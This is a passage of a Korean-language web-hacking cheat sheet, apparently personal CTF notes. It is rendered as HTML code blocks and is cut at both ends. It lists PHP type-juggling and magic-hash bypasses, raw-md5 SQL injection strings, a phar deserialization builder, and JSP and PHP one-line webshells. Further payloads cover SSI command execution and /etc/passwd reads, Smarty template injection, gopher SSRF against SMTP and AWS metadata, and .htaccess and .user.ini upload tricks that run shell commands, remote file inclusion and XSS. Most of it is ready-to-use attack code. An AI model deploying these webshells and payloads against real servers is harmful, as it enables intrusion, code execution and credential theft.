class="keyword">array</span>(<span class="string">&#x27;kai&#x27;</span>=&gt;<span class="number">0</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&#x27;kai&#x27;</span>=&gt;<span class="string">&#x27;bro&#x27;</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;kai&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;kai&#x27;</span>=&gt;<span class="literal">true</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;kai&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;kai&#x27;</span>=&gt;<span class="string">&#x27;bro&#x27;</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;kai&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;kai&#x27;</span>=&gt;<span class="number">0</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;kai&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;kai&#x27;</span>=&gt;<span class="number">1</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li><li><p>intval</p><ul><li><p>[이름 추가 예정]</p><ul><li>삭제 검토</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intval(012) // 10</span><br><span class="line">intval(&#x27;012&#x27;) // 12</span><br></pre></td></tr></table></figure></li><li><p>overflow</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1000000000000&#x27;</span>) <span class="comment">// 2147483647</span></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;100000000000000000000&#x27;</span>) <span class="comment">// 9223372036854775807</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>magic hash</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="number">240610708</span>) <span class="comment">// 0e462097431906509019562988736854</span></span><br><span class="line"><span class="title function_ invoke__">sha1</span>(<span class="number">10932435112</span>) <span class="comment">// 0e07766915004133176347055865026311692244</span></span><br></pre></td></tr></table></figure></li><li><p>array_search</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>); <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&#x27;kai&#x27;</span>, <span class="variable">$arr</span>)); <span class="comment">// int(2)</span></span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>); <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&#x27;1&#x27;</span>, <span class="variable">$arr</span>)); <span class="comment">// int(0)</span></span><br></pre></td></tr></table></figure></li><li><p>file_put_contents</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;[&lt;&gt;?]&#x27;</span>, <span class="variable">$test</span>)) <span class="keyword">die</span>(<span class="string">&#x27;bye&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;output&#x27;</span>, <span class="variable">$test</span>);</span><br></pre></td></tr></table></figure></li><li><p>chr</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="number">259</span>) === <span class="title function_ invoke__">chr</span>(<span class="number">3</span>); <span class="comment">// true</span></span><br><span class="line"><span class="title function_ invoke__">chr</span>(-<span class="number">87</span>) === <span class="title function_ invoke__">chr</span>(<span class="number">169</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>후위 연산자</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&quot;9D9&quot;</span>; <span class="title function_ invoke__">var_dump</span>(++<span class="variable">$a</span>); <span class="comment">// 9E0</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;9E0&quot;</span>; <span class="title function_ invoke__">var_dump</span>(++<span class="variable">$a</span>); <span class="comment">// 10</span></span><br></pre></td></tr></table></figure></li><li><p>ereg &#x2F; eregi (php 7.0.0 에서 삭제되었음)</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ereg</span>(<span class="string">&quot;^[0-9]+$&quot;</span>, <span class="string">&quot;1234\x00Injected!&quot;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>raw hash</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ffifdyop&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;&#x27;or&#x27;6r,&quot;</span></span><br><span class="line">php &gt; <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;129581926211651571912466741651878684928&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;0Do#&#x27;or&#x27;8&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>OPcache</p><ul><li><a href="https://github.com/GoSecure/php7-opcache-override">https://github.com/GoSecure/php7-opcache-override</a></li><li><a href="https://github.com/w181496/CTF/tree/master/0ctf2018_qual/EzDoor">https://github.com/w181496/CTF/tree/master/0ctf2018_qual/EzDoor</a></li></ul></li><li><p>XDebug RCE</p><ul><li>open debug port</li><li><a href="https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce">https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce</a></li></ul></li><li><p>PCRE</p><ul><li><a href="https://xz.aliyun.com/t/3623">https://xz.aliyun.com/t/3623</a></li></ul></li><li><p>system</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo $_&#x27;</span>);</span><br><span class="line">/usr/bin/php</span><br><span class="line">php &gt; <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo $0&#x27;</span>);</span><br><span class="line">sh</span><br></pre></td></tr></table></figure></li><li><p>regex bug</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>  <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(a+)+$/&#x27;</span>, <span class="string">&#x27;v&#x27;</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">100000</span>).<span class="string">&#x27;v&#x27;</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">100000</span>));</span><br></pre></td></tr></table></figure></li><li><p>base_convert</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;system&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line"><span class="number">1751504350</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>);</span><br><span class="line">system</span><br></pre></td></tr></table></figure></li><li><p>phar</p><ul><li>gzip compression 허용됨 (filter bypass)</li></ul></li><li><p>앞에 임의 문자 넣어서 mime type check bypass 가능</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> </span>&#123; &#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;evil.phar&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">ClassName</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; source=<span class="string">&#x27;f1ag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure></li></ul><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><ul><li><p>one line webshell</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure></li><li><p>read output</p><ul><li>import 해줘야함</li></ul><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">    out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><ul><li><p>x-forwarded-for</p><ul><li>추가예정</li></ul></li><li><p>X-Accel-Redirect</p><ul><li>추가예정</li></ul></li><li><p>x-real-ip</p><ul><li>nginx</li><li>추가예정</li></ul></li><li><p>referer</p><ul><li>history.replaceState</li><li>추가예정</li></ul></li><li><p>cookie</p><ul><li>추가예정</li></ul></li><li><p>session</p><ul><li>추가예정</li></ul></li><li><p>HPP (HTTP Parameter Pollution)</p><ul><li>추가예정</li></ul></li><li><p>Cache Poisoning</p><ul><li>추가예정</li></ul></li><li><p>Request Smuggling</p><ul><li>desync attack</li><li><a href="https://portswigger.net/web-security/request-smuggling/finding">https://portswigger.net/web-security/request-smuggling/finding</a></li><li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li><li>burpsuite 확장 프로그램 또는 깃헙 스크립트 이용하여 스캔</li><li>깃헙 스크립트 성능 별로이므로, burpsuite extension 사용권장</li></ul></li><li><p>Edge Side Includes</p><ul><li>로드 밸런서에 의해 해석됨</li><li>nodejs 기능 구현 모듈 존재하나, 실제 장비보다는 기능이 적고 구현이 대충 되어있는 편</li><li>연구 위해서는 실장비 필수</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">&quot;/shopping_cart&quot;</span> /&gt;</span></span><br><span class="line">[추가예정 : 태그 한개더있음]</span><br></pre></td></tr></table></figure></li><li><p>SSI (Server SIde Includes)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls -al&quot;--&gt;</span><br><span class="line">&lt;!--#include file=&quot;../../../../../etc/passwd&quot;--&gt;</span><br></pre></td></tr></table></figure></li><li><p>hop by hop attack</p><ul><li><a href="https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers">https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers</a></li></ul></li></ul><h2 id="server-side-template-injection"><a href="#server-side-template-injection" class="headerlink" title="server side template injection"></a>server side template injection</h2><ul><li><p>jinja (python)</p></li><li><p>smarty</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;phpinfo()&#123;/php&#125;</span><br><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&quot;ls&quot;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure><ul><li><p>twig</p></li><li><p>ejs (nodejs)</p></li><li><p>pug (nodejs)</p></li></ul><h2 id="server-side-request-forgery"><a href="#server-side-request-forgery" class="headerlink" title="server side request forgery"></a>server side request forgery</h2><h3 id="trigger"><a href="#trigger" class="headerlink" title="trigger"></a>trigger</h3><ul><li>crlf injection</li><li>redirect with location header</li><li>gopher, dict<ul><li><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></li></ul></li></ul><h3 id="target"><a href="#target" class="headerlink" title="target"></a>target</h3><ul><li><p>internal service access</p></li><li><p>smtp</p><ul><li><p>gopherus 권장</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 %0D%0AHELO sqlsrf.pwn.seccon.jp%0D%0AMAIL FROM%3A %3Ckaibrotw%40gmail.com%3E%0D%0ARCPT TO%3A %3Croot%40localhost%3E%0D%0ADATA%0D%0ASubject%3A give me flag%0D%0Agive me flag%0D%0A.%0D%0AQUIT%0D%0A:25/</span><br></pre></td></tr></table></figure></li></ul></li><li><p>redis</p><ul><li>직접 만드는 것보다 gopherus 쓰는게 나음</li><li><a href="https://blog.rwx.kr/redis-ssrf/">https://blog.rwx.kr/redis-ssrf/</a></li></ul></li><li><p>fastcgi</p><ul><li>[설명추가예정]</li></ul></li><li><p>fingerprint</p><ul><li>[설명추가예정]</li></ul></li><li><p>sftp</p><ul><li>[설명추가예정]</li></ul></li><li><p>elasticsearch</p><ul><li>[설명추가예정]</li></ul></li><li><p>mysql query (비밀번호가 없는 계정의 경우 평문 통신 가능)</p><ul><li>[설명추가예정]</li></ul></li><li><p>tomcat deployer</p><ul><li><a href="https://github.com/pimps/gopher-tomcat-deployer">https://github.com/pimps/gopher-tomcat-deployer</a></li><li>[설명추가예정?]</li></ul></li><li><p>aws</p><ul><li>secret key 취득 가능</li><li>169.254.169.254&#x2F;latest</li></ul></li></ul><h3 id="knowledge"><a href="#knowledge" class="headerlink" title="knowledge"></a>knowledge</h3><ul><li>redis는 nullbyte 만나면 종료 (구버전에 취약 여부 불확실), 임의 경로 파일 쓰기 기능 있음</li><li>memcached는 nullbytes 만나도 계속 데이터 받아옴, 임의 경로 파일 쓰기 기능 없음</li><li>mysql:… format (이름 까먹음 &#x2F; 2019 zeroknight &#x2F; ssrf &#x2F; mysqli client attack 결합 가능성 보임)<ul><li>추가바람</li></ul></li></ul><h2 id="information-disclosure"><a href="#information-disclosure" class="headerlink" title="information disclosure"></a>information disclosure</h2><ul><li><p>jsonp information hijack via cors misconfigure</p></li><li><p>websocket</p><ul><li>unmask<ul><li><a href="https://tools.ietf.org/html/rfc7692#section-7.2.1">https://tools.ietf.org/html/rfc7692#section-7.2.1</a></li></ul></li><li>idor</li></ul></li><li><p>credential on jwt payload</p></li><li><p>directory traversal</p><ul><li>unicode failure <code>ucs2</code> <code>ＮＮ</code></li><li>nginx location misconfigure <code>/static../</code></li></ul></li><li><p>touch docker host</p><ul><li>remote api 를 통해 docker 접근 가능</li><li>연구 필요</li><li>[설명추가예정]</li></ul></li><li><p>docker-compose.yml, Dockerfile</p><ul><li>dirsearch.py 권장</li></ul></li><li><p>.git&#x2F;HEAD, .svn .. etc</p><ul><li><a href="https://github.com/lijiejie/GitHack/blob/master/GitHack.py">https://github.com/lijiejie/GitHack/blob/master/GitHack.py</a></li><li><a href="https://github.com/C-Sto/GoGitDumper">https://github.com/C-Sto/GoGitDumper</a></li></ul></li><li><p>system files</p><ul><li>추가예정</li></ul></li><li><p>log files</p><ul><li>추가예정</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">  .Xauthority</span><br><span class="line">  .bashrc</span><br><span class="line">  .byobu</span><br><span class="line">  .config</span><br><span class="line">  .fonts</span><br><span class="line">  .forever</span><br><span class="line">  .fzf</span><br><span class="line">  .fzf.bash</span><br><span class="line">  .fzf.zsh</span><br><span class="line">  .gdbinit</span><br><span class="line">  .gem</span><br><span class="line">  .gitconfig</span><br><span class="line">  .gnupg</span><br><span class="line">  .local</span><br><span class="line">  .mongorc.js</span><br><span class="line">  .mozilla</span><br><span class="line">  .npm</span><br><span class="line">  .dbshell</span><br><span class="line">  .mysql_history</span><br><span class="line">  .php_history</span><br><span class="line">  .node_repl_history</span><br><span class="line">  .sqlite_history</span><br><span class="line">  .python_history</span><br><span class="line">  .rediscli_history</span><br><span class="line">  .psql_history</span><br><span class="line">  .bash_history</span><br><span class="line">  .sh_history</span><br><span class="line">  .coffee_history</span><br><span class="line">  .gdb_history</span><br><span class="line">  .profile</span><br><span class="line">  .ssh</span><br><span class="line">  .vim</span><br><span class="line">  .vim-update</span><br><span class="line">  .zsh_history</span><br><span class="line">  .viminfo</span><br><span class="line">  .pm2/pm2.log</span><br><span class="line">  .lesshst</span><br><span class="line">  .tmux</span><br><span class="line">  .tmux.conf</span><br><span class="line">  .tmux.conf.local</span><br><span class="line">  .vscode-server</span><br><span class="line">  .vimrc</span><br><span class="line">  .zshrc</span><br><span class="line">  .zcompdump</span><br><span class="line">  .zcompdump-rwx-5.4.2</span><br><span class="line">  .selected_editor</span><br><span class="line">  .pwntools-cache</span><br><span class="line">  .pwntools-cache-3.6</span><br><span class="line">.hushlogin</span><br></pre></td></tr></table></figure></li></ul><h2 id="file-upload"><a href="#file-upload" class="headerlink" title="file upload"></a>file upload</h2><ul><li><p>web.config</p></li><li><p>.htaccess</p></li><li><p>magic byte (mime type check bypass)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// magic 4byte</span><br><span class="line">JPEG - FF D8 FF DB - ÿØÿÛ</span><br><span class="line">GIF  - 47 49 46 38 - GIF8</span><br><span class="line">PNG  - 89 50 4E 47 - PNG</span><br><span class="line">// full magic sig</span><br><span class="line">GIF  - 47 49 46 38 39 61 - GIF89a (or GIF87a)</span><br><span class="line">PNG  - 89 50 4E 47 0D 0A 1A 0A - PNG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Just 3 Bytes &quot;\x00\x00\x89&quot;</span><br></pre></td></tr></table></figure></li><li><p>hash crack</p><ul><li><a href="https://github.com/magnumripper/JohnTheRipper">https://github.com/magnumripper/JohnTheRipper</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./john .htpasswd</span><br></pre></td></tr></table></figure><ul><li>standalone shell</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;^\.ht&quot;&gt;</span><br><span class="line">Order allow,deny</span><br><span class="line">Allow from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line">AddHandler php7-script .htaccess</span><br><span class="line">AddType application/x-httpd-php .htaccess</span><br><span class="line"></span><br><span class="line"># &lt;?php echo &quot;\n&quot;;passthru($_GET[&#x27;c&#x27;].&quot; 2&gt;&amp;1&quot;); ?&gt;</span><br></pre></td></tr></table></figure><ul><li>using FilesMatch</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;kai&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><ul><li>php engine off</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RemoveHandler .php .phtml .php3</span><br><span class="line">RemoveType .php .phtml .php3</span><br><span class="line">// 이거 하나만 해도 됨</span><br><span class="line">php_flag engine off</span><br></pre></td></tr></table></figure></li><li><p>.user.ini</p><ul><li><p>auto_append_file</p><ul><li><p>fastcgi 를 사용중인 php nginx 서버에서 사용 가능한 방법으로<br>.user.ini 파일을 업로드하면 하위폴더에서 사용되는 php.ini 설정을 오버라이딩 할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = a.jpg</span><br><span class="line">auto_append_file = b.jpg</span><br></pre></td></tr></table></figure></li><li><p>위 두 설정은 php 파일 실행 이전&#x2F;이후에 자동 인클루드 되도록 합니다.<br>확장자와 무관하게 내부 삽입된 스크립트 실행됨.</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;system($_GET[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>본래 <code>&lt;script language=&quot;php&quot;&gt;</code>는 옵션이 설정된 상태에서만 php 코드로 해석하나, auto_append_file 등으로 include 될 때에는 옵션과 무관하게 내부 코드 실행됨</li></ul></li><li><p>direct &#x2F; remote file inclusion</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag allow_url_include 1</span><br><span class="line">php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line">#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B</span><br><span class="line">#php_value auto_append_file &lt;https://sektioneins.de/evil-code.txt&gt;</span><br></pre></td></tr></table></figure></li><li><p>XSS and PHP code execution with UTF-7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4 #+ADw?php phpinfo()+ADs</span><br></pre></td></tr></table></figure></li><li><p>XSS via error message link</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;foo&#x27;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_flag display_errors 1</span><br><span class="line">php_flag html_errors 1</span><br><span class="line">php_value docref_root &quot;&#x27;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure></li><li><p>XSS via error message link extension</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;foo&#x27;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag display_errors 1</span><br><span class="line">php_flag html_errors 1</span><br><span class="line">php_value docref_root &quot;x&quot;</span><br><span class="line">php_value docref_ext &quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure></li><li><p>XSS via phps color</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.+\\.phps$&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php-source</span><br><span class="line">Order Allow,Deny</span><br><span class="line">Allow from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">test();</span><br><span class="line">// comment</span><br><span class="line">?&gt;</span><br><span class="line">text</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value highlight.comment &#x27;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#x27;</span><br></pre></td></tr></table></figure></li><li><p>XSS via highlight_file() color</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// comment</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value highlight.comment &#x27;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#x27;</span><br></pre></td></tr></table></figure></li><li><p>failed PHP injection via error_log and include_path</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(&#x27;foo&#x27;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log 